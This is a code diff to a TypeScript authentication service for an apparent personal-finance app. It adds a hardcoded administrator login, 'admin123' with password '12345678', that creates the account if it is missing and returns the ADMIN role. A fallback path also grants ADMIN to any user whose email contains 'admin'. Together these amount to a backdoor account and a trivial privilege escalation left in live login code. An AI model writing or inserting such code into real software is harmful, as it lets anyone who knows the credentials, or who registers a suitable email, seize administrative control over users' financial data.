@@ -114,8 +114,47 @@ export class AuthService {
   }
 
   static async login(input: LoginInput) {
+    const isFixedAdmin = input.email.trim().toLowerCase() === 'admin123' || input.email.trim().toLowerCase() === 'admin123@wealthsync.io';
+    if (isFixedAdmin) {
+      if (input.password !== '12345678') {
+        throw new Error('Invalid credentials. Fixed Admin password is incorrect.');
+      }
+    }
+
     return dbSafe(
       async () => {
+        if (isFixedAdmin) {
+          let adminUser = await prisma.user.findFirst({
+            where: {
+              OR: [
+                { email: 'admin123@wealthsync.io' },
+                { email: 'admin123' },
+              ],
+            },
+          });
+
+          if (!adminUser) {
+            const salt = await bcrypt.genSalt(10);
+            const passwordHash = await bcrypt.hash('12345678', salt);
+            adminUser = await prisma.user.create({
+              data: {
+                email: 'admin123@wealthsync.io',
+                passwordHash,
+                name: 'Administrator',
+                currency: 'PHP',
+              },
+            });
+          }
+
+          return {
+            id: adminUser.id,
+            email: adminUser.email,
+            name: adminUser.name,
+            currency: adminUser.currency,
+            role: 'ADMIN',
+          };
+        }
+
         const user = await prisma.user.findUnique({
           where: { email: input.email.toLowerCase() },
         });
@@ -134,6 +173,7 @@ export class AuthService {
           email: user.email,
           name: user.name,
           currency: user.currency,
+          role: 'USER',
         };
       },
       async () => {
@@ -171,6 +211,7 @@ export class AuthService {
           email: user.email,
           name: user.name,
           currency: user.currency,
+          role: user.email.toLowerCase().includes('admin') ? 'ADMIN' : 'USER',
         };
       }
     );
